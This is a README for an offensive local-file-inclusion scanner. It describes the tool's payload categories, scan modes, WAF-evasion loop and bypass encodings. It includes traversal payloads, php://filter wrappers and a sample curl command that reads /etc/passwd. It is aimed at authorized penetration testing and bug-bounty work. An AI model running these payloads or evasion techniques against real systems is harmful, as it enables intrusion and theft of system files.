# ⚡ m7lfi — Advanced LFI Testing Framework

**Milkyway Intelligence | Author: Sharlix**  
> For authorized lab testing and bug bounty research only.

---

## 🏗️ Architecture

```
m7lfi/
├── core/
│   ├── scanner.py           # Main scan orchestrator
│   ├── request_engine.py    # Async HTTP (httpx + HTTP/2)
│   ├── response_analyzer.py # LFI/WAF detection logic
│   ├── payload_engine.py    # Payload loader + mutation system
│   ├── bypass_engine.py     # Adaptive evasion techniques
│   ├── exploit_engine.py    # Post-LFI exploit chains
│   ├── rate_controller.py   # Dynamic speed control
│   └── report_engine.py     # JSON / HTML / TXT reports
├── payloads/
│   ├── traversal.txt        # Directory traversal (66 payloads)
│   ├── encoding.txt         # URL/double/unicode encoding (47)
│   ├── wrappers.txt         # PHP stream wrappers (41)
│   ├── linux.txt            # Linux-specific targets (87)
│   ├── windows.txt          # Windows-specific targets (47)
│   ├── log_poison.txt       # Log poisoning targets (31)
│   └── framework.txt        # CMS/framework configs (57)
├── configs/
│   ├── settings.yaml        # Main configuration
│   └── headers.json         # Header pools
├── cli/
│   └── main.py              # CLI entry point
├── output/
│   └── reports/             # Generated reports land here
├── requirements.txt
└── installer.sh
```

**Total payloads: 326 across 7 categories**

---

## 🚀 Installation

```bash
git clone https://github.com/httpsm7/m7lfi
cd m7lfi
chmod +x installer.sh
./installer.sh
```

Or manually:
```bash
pip install -r requirements.txt
python3 cli/main.py --help
```

---

## ⚡ Usage

```bash
# Single URL scan
m7lfi -u "https://target.com/page.php?file=test"

# URL list scan
m7lfi -l urls.txt --threads 100 --mode smart

# Stealth mode (WAF present)
m7lfi -u "https://target.com/?page=home" --mode stealth

# With exploit chains after confirmation
m7lfi -u "https://target.com/?file=1" --exploit

# Specific payload categories only
m7lfi -u "https://target.com/?file=1" --categories linux,traversal,encoding

# Through Burp Suite proxy
m7lfi -u "https://target.com/?file=1" --proxy http://127.0.0.1:8080

# Manual interactive mode
m7lfi --manual

# Verbose (show every request result)
m7lfi -u "https://target.com/?file=test" --verbose
```

---

## 🧠 How It Works — Adaptive Loop

```
for each URL:
  → extract parameters
  → get baseline response (clean request)

  for each parameter:
    for each payload in 326 payloads:

      1. SEND request with payload injected
      2. ANALYZE response:
           - Keyword match (root:x:, boot.ini, etc.)
           - WAF signature detection
           - Response length anomaly
      3. IF blocked:
           - MUTATE payload (32 bypass variants)
           - RETRY with bypass
           - Rate controller adjusts speed
      4. IF vulnerable:
           - Save result
           - Optionally run exploit chains
           - Stop (no redundant requests)
```

---

## 🔁 Scan Modes

| Mode    | Threads | Delay    | Use Case              |
|---------|---------|----------|-----------------------|
| fast    | 200     | 0s       | Internal lab, no WAF  |
| smart   | 50      | 0.3s     | Bug bounty (default)  |
| stealth | 10      | 1.5s+jitter | WAF-protected targets |

Smart mode **auto-downgrades to stealth** after 3 consecutive WAF hits.

---

## 💣 Bypass Techniques

| Trigger               | Technique                          |
|-----------------------|------------------------------------|
| `../` blocked         | URL encode → `..%2f`               |
| WAF detected          | Double encode → `..%252f`          |
| Keyword filter        | Unicode overlong → `..%c0%af`      |
| Any block             | Case mutation, backslash, null byte |
| PHP app               | `php://filter/convert.base64-encode/resource=` |

---

## 📊 Sample Report Output

```
[+] VULNERABILITY FOUND
    URL       : https://target.com/page.php?file=test
    Parameter : file
    Payload   : ../../../../etc/passwd
    Bypass    : direct
    Status    : 200
    Snippet   : root:x:0:0:root:/root:/bin/bash
                daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    Reproduce : curl -sk "https://target.com/page.php?file=../../../../etc/passwd"
```

Reports also generated as HTML dashboard and JSON.

---

## ⚙️ Configuration (configs/settings.yaml)

```yaml
threads: 50
timeout: 10
retry: 2
mode: smart          # fast | smart | stealth
delay: 0.3
jitter: 0.2
proxy: null          # http://127.0.0.1:8080 for Burp
verify_ssl: false
categories: all
exploit: false
verbose: false
```

---

## 🔐 Disclaimer

m7lfi is designed exclusively for:
- Authorized penetration testing engagements
- Bug bounty programs (HackerOne, Bugcrowd, Intigriti, etc.)
- Lab / CTF environments you own or have permission to test

**Do not use against systems without explicit written authorization.**
